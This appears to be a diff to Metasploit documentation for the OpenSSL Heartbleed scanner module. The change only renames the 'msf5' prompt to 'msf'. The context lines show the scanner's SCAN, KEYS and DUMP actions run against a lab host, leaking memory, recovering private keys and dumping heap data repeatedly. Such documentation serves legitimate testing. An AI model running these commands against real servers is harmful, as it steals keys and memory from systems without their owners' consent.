@@ -118,12 +118,12 @@ $ curl https://localhost:8443 -k
 With the default action of `SCAN` we can determine if the server is vulnerable or not.
 
 ```
-msf5 > use auxiliary/scanner/ssl/openssl_heartbleed 
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
+msf > use auxiliary/scanner/ssl/openssl_heartbleed 
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
 rhosts => 222.222.2.222
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rport 44330
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set rport 44330
 rport => 44330
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+msf auxiliary(scanner/ssl/openssl_heartbleed) > run
 
 [+] 222.222.2.222:44330   - Heartbeat response with leak, 65535 bytes
 [*] 222.222.2.222:44330   - Scanned 1 of 1 hosts (100% complete)
@@ -140,9 +140,9 @@ watch 'cat openssl-1.0.1d/key.pem; cat openssl-1.0.1d/cert.pem'
 ```
 
 ```
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set action KEYS
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set action KEYS
 action => KEYS
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+msf auxiliary(scanner/ssl/openssl_heartbleed) > run
 
 [*] 222.222.2.222:44330   - Scanning for private keys
 [*] 222.222.2.222:44330   - Getting public key constants...
@@ -185,15 +185,15 @@ FbawD4i1LZxrihOuuy3nt34hIlprjtW2WV49NiWnbwEzZo6ejm5NRg==
 ### DUMP against s_server on Ubuntu 18.04 with OpenSSL 1.0.1d
 
 ```
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
 action => DUMP
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run
+msf auxiliary(scanner/ssl/openssl_heartbleed) > run
 
 [+] 222.222.2.222:44330   - Heartbeat response with leak, 65535 bytes
 [+] 222.222.2.222:44330   - Heartbeat data stored in /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
 [*] 222.222.2.222:44330   - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > cat /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
+msf auxiliary(scanner/ssl/openssl_heartbleed) > cat /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
 [*] exec: cat /root/.msf4/loot/20191012213447_default_222.222.2.222_openssl.heartble_500776.bin
 
 ���]�O���g�hE�_.[�MT��b��΋k�f��
@@ -354,12 +354,12 @@ Because arbitrary memory is dumped, a high volume application that uses openSSL 
 fairly often. The `repeat` command can be used to execute the module multiple times.
 
 ```
-msf5 > use auxiliary/scanner/ssl/openssl_heartbleed
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
+msf > use auxiliary/scanner/ssl/openssl_heartbleed
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
 rhosts => 222.222.2.222
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
+msf auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
 action => DUMP
-msf5 auxiliary(scanner/ssl/openssl_heartbleed) > repeat -n 10 run
+msf auxiliary(scanner/ssl/openssl_heartbleed) > repeat -n 10 run
 
 [*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
